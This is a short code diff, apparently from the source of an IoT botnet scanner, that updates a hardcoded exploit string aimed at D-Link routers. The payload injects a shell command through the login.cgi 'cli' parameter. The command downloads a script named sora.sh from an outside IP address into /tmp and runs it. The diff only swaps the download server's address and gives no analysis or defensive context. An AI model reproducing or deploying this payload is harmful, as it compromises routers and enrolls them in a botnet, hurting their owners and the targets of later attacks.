@@ -281,7 +281,7 @@ void dlinkscanner_scanner_init(void)
                         #endif
 
 						
-                        util_strcpy(conn->payload_buf,  "GET /login.cgi?cli=aa%20aa%27;wget%20http://34.147.211.204/sora.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: Hakai/2.0\r\n\r\n");
+                        util_strcpy(conn->payload_buf,  "GET /login.cgi?cli=aa%20aa%27;wget%20http://35.234.54.226/sora.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: Hakai/2.0\r\n\r\n");
                         send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                         util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                         util_zero(conn->rdbuf, sizeof(conn->rdbuf));
